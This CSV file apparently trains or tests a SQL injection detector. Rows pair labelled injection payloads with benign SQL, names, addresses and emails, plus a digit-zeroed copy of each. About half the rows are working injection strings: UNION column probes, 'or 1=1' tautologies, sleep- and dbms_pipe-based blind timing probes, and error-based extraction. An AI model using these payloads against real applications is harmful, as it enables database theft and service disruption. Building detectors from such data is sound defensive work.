Sentence,Label,Processed_Sentence
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""mejy""  =  ""mejy",1.0,"0""  )   or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and   (  ""mejy""  =  ""mejy"
-7346 or 8571  =  8571--,1.0,-0 or 0  =  0--
SELECT MIN ( lips )  AS giant FROM mixture,0.0,select min ( lips )  as giant from mixture
breanne,0.0,breanne
5693420000000000,0.0,0
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",1.0,"0' where 0  =  0 union all select null,null,null,null,null,null,null,null--"
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",1.0,"0' or row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and 'owwf'  =  'owwf"
select * from users where id  =  1.<@. or 1  =  1 -- 1,1.0,select * from users where id  =  0.<@. or 0  =  0 -- 0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0.0,select * from recall where motor = 'officer' fetch first 0 rows only
-4542'   )    )    order by 1#,1.0,-0'   )    )    order by 0#
SELECT * FROM market WHERE road = 'long' LIMIT 3,0.0,select * from market where road = 'long' limit 0
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1.0,"-0%"" union all select 0,0,0,0,0,0,0,0#"
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'nhrc' like 'nhrc,1.0,0'   )    )     )   and   (  0  =  0  )  *0 and    (    (     (  'nhrc' like 'nhrc
1'  )   as chla where 6098  =  6098,1.0,0'  )   as chla where 0  =  0
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1.0,"-0' union all select 0,0,0,0,0,0,0,0--"
SELECT * FROM writer WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from writer where price not between 0 and 0
"   SELECT Employees.eat, COUNT ( Orders.fairlyID )  AS interiorFROM    ( OrdersINNER JOIN imagine ON Orders.fearID  =  Employees.thingID ) ",0.0,"   select employees.eat, count ( orders.fairlyid )  as interiorfrom    ( ordersinner join imagine on orders.fearid  =  employees.thingid ) "
"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1.0,"0' in boolean mode  )   or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  #"
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1.0,"0"" where 0  =  0 and   (  0  =  0  )  *0--"
gladiolos 30,0.0,gladiolos 0
ayate,0.0,ayate
SELECT meet ( s FROM avoid RIGHT JOIN,0.0,select meet ( s from avoid right join
"  SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )  ",0.0,"  select * from call where flight in  ( 'become', 'who', 'basket' )  "
SELECT storm ( s )  FROM hung,0.0,select storm ( s )  from hung
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367581 ) ,0.0,select wp_posts.* from wp_posts where id in  ( 0 ) 
"sierra de la estrella, 86,",0.0,"sierra de la estrella, 0,"
yamasaki@multaspendientes.eg,0.0,yamasaki@multaspendientes.eg
yoon,0.0,yoon
nancy,0.0,nancy
" SELECT * FROM radio ORDER BY wind ASC, sang DESC",0.0," select * from radio order by wind asc, sang desc"
"   SELECT behind, excitement, cardFROM exact WHERE disease  IS NOT NULL",0.0,"   select behind, excitement, cardfrom exact where disease  is not null"
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0%""   )    )     )   or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
zaleska_legon@zampy.so,0.0,zaleska_legon@zampy.so
1  )   where 8375  =  8375,1.0,0  )   where 0  =  0
1'   )    )    as iuta where 1482  =  1482,1.0,0'   )    )    as iuta where 0  =  0
87053274e,0.0,0e
SELECT TOP 50 PERCENT * FROM kept,0.0,select top 0 percent * from kept
select sleep  (  5  )   and '%'  =  ',1.0,select sleep  (  0  )   and '%'  =  '
"INSERT INTO wrong ( taste, upward, daughter, develop, word, very )  VALUES  ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )  ",0.0,"insert into wrong ( taste, upward, daughter, develop, word, very )  values  ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )  "
intercesoriamente,0.0,intercesoriamente
"cami de almoster, 109,",0.0,"cami de almoster, 0,"
-5356'  )   or 9323  =  9323#,1.0,-0'  )   or 0  =  0#
"1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1.0,"0'||  (  select 'ozki' where 0  =  0   (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from   (  values  (  0   )    )      )    )   ||'"
-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,1.0,-0'   )    )    as tkqp where 0  =  0 or 0  =  0#
"1%"" union all select null,null,null,null,null,null--",1.0,"0%"" union all select null,null,null,null,null,null--"
SELECT COUNT ( darknessID ) FROM nodded,0.0,select count ( darknessid ) from nodded
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  ",0.0,"insert into my ( beneath, clock, worth, cannot, how, bear )  values  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  "
oestreic,0.0,oestreic
mcallum,0.0,mcallum
c/ pirucha s/n 4-e,0.0,c/ pirucha s/n 0-e
 UPDATE lift SET try = 'thin'WHERE occur = 'season',0.0, update lift set try = 'thin'where occur = 'season'
"-5526 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1.0,"-0 or 0 group by concat  (  0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )    having min  (  0  )  #"
ricard,0.0,ricard
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) ,0.0,select * from becoming where hunter in  ( select thin from guess ) 
1'   )    )    as xqam where 6750  =  6750,1.0,0'   )    )    as xqam where 0  =  0
"  SELECT walk AS throw, needed AS [any]  FROM death",0.0,"  select walk as throw, needed as [any]  from death"
SELECT pen ( s )  FROM scientist SELECT bank ( s ) ,0.0,select pen ( s )  from scientist select bank ( s ) 
-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1.0,-0'  )   as szpd where 0  =  0 or 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )  --
"iif  (  2452  =  8999,1,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',0.0,select * from swim where ship not like '[suppose]%'
"   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) ",0.0,"   select employees.accident, count ( orders.rhythmid )  as meantfrom    ( ordersinner join division on orders.stripid  =  employees.takenid ) "
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from limited fetch first 0 percent rows only
select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,1.0,select   (  case when   (  0  =  0  )   then 0 else 0/  (  select 0  )   end  )  --
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1.0,"0'||  (  select 'bccx' where 0  =  0 and elt  (  0  =  0,sleep  (  0   )    )     )  ||'"
"   SELECT die, hard+ ', ' + ask+ ' ' + suggest+ ', ' + drop AS threw  FROM ability",0.0,"   select die, hard+ ', ' + ask+ ' ' + suggest+ ', ' + drop as threw  from ability"
"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0'  )   where 0  =  0 or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
SELECT COUNT ( grabbed )  FROM highway,0.0,select count ( grabbed )  from highway
-2983'  )   or 8571  =  8571--,1.0,-0'  )   or 0  =  0--
SELECT COUNT ( DISTINCT danger )  FROM fallen,0.0,select count ( distinct danger )  from fallen
"1""   )    )    as turj where 1237  =  1237",1.0,"0""   )    )    as turj where 0  =  0"
carretera de las ermitas 188,0.0,carretera de las ermitas 0
SELECT * FROM age,0.0,select * from age
-6202   )    )    or 7845  =  1962--,1.0,-0   )    )    or 0  =  0--
1' and 1541  =  6868#,1.0,0' and 0  =  0#
SELECT * FROM way WHERE vertical NOT LIKE 'member%',0.0,select * from way where vertical not like 'member%'
"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1.0,"0""   )    )    as duny where 0  =  0 or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
morande,0.0,morande
"  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object",0.0,"  update making set had =  'know', city =  'means' where mind =  object"
"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1.0,"-0 or 0 group by concat  (  0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )    having min  (  0  )  #"
"  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0.0,"  select nuts,though,worry from aside left join orders on quick.careid =  sometime.write order by crack.card"
"masia ca l'angel 39,",0.0,"masia ca l'angel 0,"
SELECT park ( s )  FROM contrast LEFT JOIN,0.0,select park ( s )  from contrast left join
SELECT mind FROM instrument UNION ALL SELECT example FROM extra ORDER BY pitch,0.0,select mind from instrument union all select example from extra order by pitch
"  UPDATE keep SET rice =  'pine', City =  'tower' WHERE birds =  split",0.0,"  update keep set rice =  'pine', city =  'tower' where birds =  split"
"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1.0,"-0'   )    )    as ymqc where 0  =  0 union all select 0,0,0,0,0,0,0--"
1933710000000000,0.0,0
schoelen.boswell@phd-photodecor.ca,0.0,schoelen.boswell@phd-photodecor.ca
DELETE FROM agree WHERE burn = 'raise',0.0,delete from agree where burn = 'raise'
SELECT * FROM repeat WHERE your = 'medicine',0.0,select * from repeat where your = 'medicine'
1'   )    )    order by 1#,1.0,0'   )    )    order by 0#
select   (  case when   (  1961  =  2048  )   then 1961 else 1961*  (  select 1961 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
s9p2212419435.5,0.0,s0p0.0
SELECT line ( s ) FROM dot INNER JOIN,0.0,select line ( s ) from dot inner join
"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",0.0,"select option_name, option_value from wp_options where autoload  =  'yes'"
SELECT * FROM flame 3 SELECT * FROM roll,0.0,select * from flame 0 select * from roll
zurueta olarte,0.0,zurueta olarte
1'+  (  select 'unpz' where 8186  =  8186,1.0,0'+  (  select 'unpz' where 0  =  0
torrente zaldvar,0.0,torrente zaldvar
"1""  )   as bksv where 5375  =  5375",1.0,"0""  )   as bksv where 0  =  0"
70489976j,0.0,0j
"INSERT INTO title ( somehow, gentle, anywhere, sight, wheel, street )  VALUES  ( 'house', 'organization'. pencil', 'stepped', 'iron', 'including', 'supply' )  ",0.0,"insert into title ( somehow, gentle, anywhere, sight, wheel, street )  values  ( 'house', 'organization'. pencil', 'stepped', 'iron', 'including', 'supply' )  "
"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",1.0,"-0""   )    )     )   union all select 0,0,0,0,0,0,0,0,0#"
end-- elvi,1.0,end-- elvi
SELECT * FROM pencil FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM secret,0.0,select * from pencil fetch first 0 percent rows onlyselect top 0 * from secret
DELETE FROM half,0.0,delete from half
1  )   as fhvb where 4008  =  4008,1.0,0  )   as fhvb where 0  =  0
SELECT * FROM wait WHERE moon = 'clearly',0.0,select * from wait where moon = 'clearly'
"-1148""   )    )    union all select 5442,5442,5442,5442#",1.0,"-0""   )    )    union all select 0,0,0,0#"
5825250000000000,0.0,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",1.0,"0' or elt  (  0  =  0,sleep  (  0   )    )    and 'vrim'  =  'vrim"
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",1.0,"0"" where 0  =  0 and   (  0  =  0  )  *0--"
SELECT effect ( s FROM on RIGHT JOIN,0.0,select effect ( s from on right join
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_1_text' LIMIT 1,0.0,select option_value from wp_options where option_name  =  '_options_footer_button_0_text' limit 0
"  SELECT journeyID AS ID, circle AS tall FROM clock",0.0,"  select journeyid as id, circle as tall from clock"
"1'  )   where 6774  =  6774 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0'  )   where 0  =  0 or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"   SELECT flame, shaking, gulfFROM buried WHERE realize  IS NOT NULL",0.0,"   select flame, shaking, gulffrom buried where realize  is not null"
c/ linajes 178 9?f,0.0,c/ linajes 0 0?f
SELECT TOP 50 PERCENT * FROM busy,0.0,select top 0 percent * from busy
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_logo' LIMIT 1,0.0,select option_value from wp_options where option_name  =  '_options_footer_logo' limit 0
"  SELECT * FROM hardly WHERE gradually NOT IN  ( 'trick', 'gold', 'tongue' )  ",0.0,"  select * from hardly where gradually not in  ( 'trick', 'gold', 'tongue' )  "
kannel,0.0,kannel
7860000000000000,0.0,0
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1.0,"-0%'  )   union all select 0,0,0,0,0,0,0,0,0,0--"
tarragona,0.0,tarragona
SELECT member ( s )  FROM mood SELECT clothing ( s ) ,0.0,select member ( s )  from mood select clothing ( s ) 
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1.0," union   (  select null, null,   (  select @@version   )    )    --"
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",1.0,"0%'  )   union all select null,null,null,null,null,null,null,null,null#"
SELECT TOP 3 * FROM wait WHERE electric = 'southern',0.0,select top 0 * from wait where electric = 'southern'
SELECT * FROM layers FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM below,0.0,select * from layers fetch first 0 rows only select top 0 percent * from below
1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1.0,0 where 0  =  0 rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  sgvo  )  --
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and    (    (   'fowu' like 'fowu"
"   SELECT rhythm, nearly, certain FROM shape WHERE world  IS NULL",0.0,"   select rhythm, nearly, certain from shape where world  is null"
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0""  )   as hfgk where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
SELECT well ( s )  FROM nothing LEFT JOIN,0.0,select well ( s )  from nothing left join
ozoa cadaveira,0.0,ozoa cadaveira
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1.0,"0"" and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and ""hcjz"" like ""hcjz"
